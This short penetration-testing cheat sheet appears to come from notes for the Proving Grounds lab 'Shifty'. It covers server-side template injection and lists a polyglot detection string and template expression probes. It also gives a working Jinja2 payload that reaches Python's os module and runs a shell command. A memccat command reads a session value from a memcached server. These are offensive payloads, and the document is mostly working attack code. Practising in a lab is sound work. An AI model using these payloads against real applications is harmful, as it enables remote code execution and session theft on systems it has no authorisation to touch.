## SSTI (Server-Side Template Injection)
- Polyglot check: `${{<%[%'"}}%\.`

### Payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

### Jinja2
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

### Python RCE
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Memcached
```bash
memccat --server=192.168.206.59 session:0c4c0507-a016-41c5-9896-0854a93f49d1
```
- See **Shifty** on Proving Grounds
